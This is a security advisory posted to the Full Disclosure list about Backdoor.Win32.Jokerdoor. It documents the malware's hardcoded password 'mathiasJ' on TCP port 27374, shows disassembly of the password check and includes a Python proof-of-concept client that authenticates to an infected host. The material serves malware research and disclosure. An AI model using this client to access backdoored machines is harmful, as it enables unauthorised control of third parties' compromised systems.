
Date: Sat, 2 Apr 2022 20:53:47 -0400
From: malvuln <malvuln13@...il.com>
To: fulldisclosure@...lists.org
Subject: [FD] Backdoor.Win32.Jokerdoor / Weak Hardcoded Credentials

Discovery / credits: Malvuln - malvuln.com (c) 2022
Original source:
https://malvuln.com/advisory/a6437375fff871dff97dc91c8fd6259f.txt
Contact: malvuln13@...il.com
Media: twitter.com/malvuln

Threat: Backdoor.Win32.Jokerdoor
Vulnerability: Weak Hardcoded Credentials
Family: Jokerdoor
Type: PE32
MD5: a6437375fff871dff97dc91c8fd6259f
Vuln ID: MVID-2022-0531
Dropped files: Random name "awup.exe"
Disclosure: 04/02/2022
Description: The malware listens on TCP port 27374. The password "mathiasJ"
is weak and hardcoded in the PE file. Failed authentication generates a
"POPUP incorrect password..." message, using TELNET results in an error
"PWDPerror reading password..." Using Nc64.exe utility results in a
trailing line feed character "\n" after the supplied password. This causes
the cmp statement check to fail even if the password is correct due to the
"\n" character.

004BDA0C | 8B 45 EC                 | mov eax,dword ptr ss:[ebp-14]
  | [ebp-14]:" mathiasJ\n"
004BDA0F | 8B 15 0C AC 4D 00        | mov edx,dword ptr ds:[4DAC0C]
  | 004DAC0C:&"mathiasJ"
004041C7 | 39 D0                    | cmp eax,edx
  | eax" mathiasJ\n", edx"mathiasJ"

So we will need to write a custom client ourselves. The password must also
be sent with no space and prefixed with "PWD" E.g. "PWDmathiasJ". Upon
successful authentication we get a message e.g. "PWDconnected time, date
Legends 2.1".

Exploit/PoC:
from socket import *
import time

MALWARE_HOST="x.x.x.x"
PORT=27374

def chk_res(s):
    res=""
    while True:
        res += s.recv(512)
        break
        if "\0" in res or "\n" in res or res == "":
            break
    return res

def doit():
    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))
    time.sleep(1)

    PAYLOAD="PWDmathiasJ"
    s.send(PAYLOAD)

    time.sleep(1)
    print(chk_res(s))
    s.close()

if __name__=="__main__":
    doit()
    print("Malvuln")


Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and that due
credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit is given to
the author. The author is not responsible for any misuse of the information
contained herein and accepts no responsibility for any damage caused by the
use or misuse of this information. The author prohibits any malicious use
of security related information or exploits by the author or elsewhere. Do
not attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper Malware
handling or the downloading of ANY Malware mentioned on this website or
elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
